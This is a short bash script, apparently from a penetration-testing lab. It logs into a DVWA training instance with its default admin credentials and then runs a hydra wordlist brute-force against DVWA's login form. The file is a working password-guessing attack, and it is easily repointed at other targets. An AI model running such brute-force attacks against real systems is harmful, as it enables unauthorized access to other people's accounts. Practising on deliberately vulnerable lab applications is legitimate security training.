#!/usr/bin/env bash
source CONFIG.sh

#get user token
TOKEN=$(curl -c $file_path/utils/dvwa.session -s http://$target_ip/dvwa/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
# get session id
PHPSESSID=$(grep PHPSESSID $file_path/utils/dvwa.session | awk -F' ' '{print $7}')
# log in
curl -L -b "PHPSESSID=${PHPSESSID};security=low" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://$target_ip/dvwa/login.php

# brute force attack
hydra -t 1 -L /home/kali/Pentesting/utils/top-usernames-shortlist.txt -P /home/kali/Pentesting/utils/10-million-password-list-top-1000.txt -vV $target_ip http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect\:H=Cookie: PHPSESSID=${PHPSESSID};security=low"
